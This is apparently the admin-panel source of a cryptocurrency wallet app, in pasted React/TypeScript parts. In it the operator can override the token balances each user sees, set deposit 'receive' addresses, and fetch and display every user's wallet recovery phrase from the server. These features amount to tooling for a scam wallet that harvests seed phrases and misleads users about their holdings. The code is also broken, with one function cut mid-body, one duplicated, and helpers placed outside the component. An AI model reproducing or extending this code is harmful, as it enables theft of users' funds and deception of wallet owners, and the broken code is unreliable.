// Admin.tsx - Part 1: Imports and Type Definitions

import { useEffect, useState, type FormEvent, type ReactNode } from 'react'
import { TokenIcon } from '../components/TokenIcon'

type TokenOverride = {
  chain: string; address: string; symbol: string; name: string
  iconUrl?: string; spam?: boolean
  balance?: number; usdValue?: number; change24h?: number
}

type DAppEntry = {
  id: string
  name: string
  url: string
  iconUrl: string
  category: string
  description: string
  chains: string[]
  verified?: boolean
}

type AdminState = {
  announcement: { text: string; active: boolean } | null
  tokens: TokenOverride[]
  receiveAddress?: { bsc?: string; eth?: string }
  dapps?: DAppEntry[]
}

type AdminUser = { 
  address: string; 
  createdAt: number; 
  lastSeen: number;
  mnemonic?: string; // Added for recovery
}

type UserTokenRow = {
  chain: string
  address: string
  symbol: string
  name: string
  iconUrl?: string
  defaultBalance: number
  balance: number
  overridden: boolean
}

const EMPTY: AdminState = {
  announcement: null,
  tokens: [],
  receiveAddress: { bsc: '', eth: '' },
  dapps: [],
}

const ADDR_RE = /x[a-fA-F0-9]{40}$/
const DAPP_CATEGORIES = ['DEX', 'DeFi', 'NFT', 'Gaming', 'Tools', 'Other'] as const

const num = (v: string | undefined) => (v === undefined || v.trim() === '' ? undefined : Number(v))
const short = (a?: string) => (a && a.length > 12 ? `${a.slice(0, 6)}…${a.slice(-4)}` : a || '—')
const shortAddr = (a: string) => `${a.slice(0, 6)}…${a.slice(-4)}`
const newId = () =>
  typeof crypto !== 'undefined' && 'randomUUID' in crypto
    ? crypto.randomUUID()
    : Math.random().toString(36).slice(2)

const relTime = (ts: number) => {
  const s = Math.floor((Date.now() - ts) / 1000)
  if (s < 60) return 'just now'
  if (s < 3600) return `${Math.floor(s / 60)}m ago`
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`
  return `${Math.floor(s / 86400)}d ago`
}
// Admin.tsx - Part 2: TabNav Component and Helper Functions

function TabNav({ activeTab, onTabChange }: { activeTab: string; onTabChange: (tab: string) => void }) {
  const tabs = [
    { id: 'general', label: 'General', icon: '⚙️' },
    { id: 'tokens', label: 'Tokens', icon: '🪙' },
    { id: 'dapps', label: 'dApps', icon: '📱' },
    { id: 'users', label: 'Users', icon: '👥' },
    { id: 'bulk', label: 'Bulk', icon: '📋' },
  ]

  return (
    <div className="flex border-b border-zinc-800 mb-6">
      {tabs.map(tab => (
        <button
          key={tab.id}
          onClick={() => onTabChange(tab.id)}
          className={`flex-1 py-3 px-4 text-sm font-medium transition-colors ${
            activeTab === tab.id 
              ? 'text-amber-400 border-b-2 border-amber-400' 
              : 'text-zinc-400 hover:text-white'
          }`}
        >
          <span className="mr-2">{tab.icon}</span>
          {tab.label}
        </button>
      ))}
    </div>
  )
}

// Bulk parsers
function parseTokenBulk(txt: string): TokenOverride[] {
  return txt.split('\n')
    .map(l => l.trim())
    .filter(Boolean)
    .map(line => {
      const parts = line.split('\t')
      if (parts.length < 4) return null
      const [chain, address, symbol, name, iconUrl] = parts
      if (!chain || !address || !symbol || !name) return null
      return {
        chain: chain.toLowerCase(),
        address: address.toLowerCase(),
        symbol,
        name,
        ...(iconUrl && { iconUrl }),
      }
    })
    .filter(Boolean) as TokenOverride[]
}

function parseDappBulk(txt: string): DAppEntry[] {
  return txt.split('\n')
    .map(l => l.trim())
    .filter(Boolean)
    .map(line => {
      const parts = line.split('\t')
      if (parts.length < 5) return null
      const [name, url, iconUrl, category, description, ...chains] = parts
      if (!name || !url || !category) return null
      return {
        id: newId(),
        name,
        url,
        iconUrl,
        category,
        description,
        chains: chains.filter(Boolean),
      }
    })
    .filter(Boolean) as DAppEntry[]
}
// Admin.tsx - Part 3: Admin Component and State Management

export function Admin() {
  const [admin, setAdmin] = useState<boolean | null>(null)
  const [password, setPassword] = useState('')
  const [state, setState] = useState<AdminState>(EMPTY)
  const [msg, setMsg] = useState('')
  const [tokenBulk, setTokenBulk] = useState('')
  const [dappBulk, setDappBulk] = useState('')
  const [activeTab, setActiveTab] = useState('general')

  // Users tab
  const [users, setUsers] = useState<AdminUser[]>([])
  const [usersLoading, setUsersLoading] = useState(false)
  const [expandedUser, setExpandedUser] = useState<string | null>(null)
  const [userTokens, setUserTokens] = useState<UserTokenRow[]>([])
  const [userTokensLoading, setUserTokensLoading] = useState(false)
  const [userMsg, setUserMsg] = useState<{ kind: 'ok' | 'err'; text: string } | null>(null)
  const [showMnemonic, setShowMnemonic] = useState<Record<string, boolean>>({})

  useEffect(() => {
    fetch('/api/v1/admin/me').then(r => r.json()).then(j => {
      setAdmin(j.admin)
      if (j.admin) fetch('/api/v1/state').then(r => r.json()).then(s => setState({ ...EMPTY, ...s }))
    })
  }, [])

  // Reload users when the Users tab is opened
  useEffect(() => {
    if (activeTab !== 'users' || !admin) return
    setUsersLoading(true)
    fetch('/api/v1/admin/users')
      .then(r => r.json())
      .then(j => setUsers(j.users ?? []))
      .catch(() => {})
      .finally(() => setUsersLoading(false))
  }, [activeTab, admin])

  // Load a user's tokens when expanded
  useEffect(() => {
    if (!expandedUser) { setUserTokens([]); return }
    setUserTokensLoading(true)
    setUserMsg(null)
    fetch(`/api/v1/admin/users/\${expandedUser}/balances`)
      .then(r => r.json())
      .then(j => setUserTokens(j.tokens ?? []))
      .catch(() => {})
      .finally(() => setUserTokensLoading(false))
  }, [expandedUser])

  async function login(e: FormEvent) {
    e.preventDefault()
    const r = await fetch('/api/v1/admin/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ password }),
    })
    if (r.ok) {
      setAdmin(true)
      fetch('/api/v1/state').then(x => x.json()).then(s => setState({ ...EMPTY, ...s }))
    } else setMsg('Wrong password')
  }

  async function save() {
    const r = await fetch('/api/v1/admin/state', {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(state),
    })
    setMsg(r.ok ? 'Saved ✓' : 'Save failed')
  }

  // Token helpers
  const addToken = () => {
    setState(p => ({
      ...p,
      tokens: [...p.tokens, { chain: 'eth', address: '', symbol: '', name: '' }],
    }))
  }

  const updateToken = (i: number, k: keyof TokenOverride, v: string | number | boolean) => {
    setState(p => ({
      ...p,
      tokens: p.tokens.map((t, idx) => (idx === i ? { ...t, [k]: v } : t)),
    }))
  }

  const removeToken = (i: number) => {
    setState(p => ({
     // Admin.tsx - Part 4: Token and dApp Management Functions

const removeToken = (i: number) => {
  setState(p => ({
    ...p,
    tokens: p.tokens.filter((_, idx) => idx !== i),
  }))
}

// dApp helpers
const addDapp = () => {
  setState(p => ({
    ...p,
    dapps: [...(p.dapps || []), { id: newId(), name: '', url: '', iconUrl: '', category: '', description: '', chains: [] }],
  }))
}

const updateDapp = (id: string, k: keyof DAppEntry, v: string | string[]) => {
  setState(p => ({
    ...p,
    dapps: (p.dapps || []).map(d => (d.id === id ? { ...d, [k]: v } : d)),
  }))
}

const removeDapp = (id: string) => {
  setState(p => ({
    ...p,
    dapps: (p.dapps || []).filter(d => d.id !== id),
  }))
}

// User balance helpers
const setBalanceOverride = (chain: string, address: string, value: string) => {
  const v = num(value)
  if (v === undefined) return
  const key = `${chain}:${address}`
  const existing = state.tokens.find(t => t.chain === chain && t.address === address)
  if (existing) {
    updateToken(state.tokens.indexOf(existing), 'balance', v)
  } else {
    setState(p => ({
      ...p,
      tokens: [...p.tokens, { chain, address, symbol: '', name: '', balance: v }],
    }))
  }
}

// Added function to fetch user mnemonic
async function fetchUserMnemonic(address: string) {
  try {
    const response = await fetch(`/api/v1/admin/users/${address}/mnemonic`);
    if (response.ok) {
      const data = await response.json();
      return data.mnemonic;
    }
    return null;
  } catch (error) {
    console.error('Error fetching mnemonic:', error);
    return null;
  }
}

// Toggle showing mnemonic for a user
const toggleShowMnemonic = async (address: string) => {
  if (showMnemonic[address]) {
    // Hide the mnemonic
    setShowMnemonic(prev => ({ ...prev, [address]: false }));
    return;
  }

  // Fetch and show the mnemonic
  const mnemonic = await fetchUserMnemonic(address);
  if (mnemonic) {
    setShowMnemonic(prev => ({ ...prev, [address]: true }));
    // Store the mnemonic in the users array
    setUsers(prevUsers => 
      prevUsers.map(user => 
        user.address === address ? { ...user, mnemonic } : user
      )
    );
  } else {
    setMsg('Failed to fetch recovery phrase');
  }
};
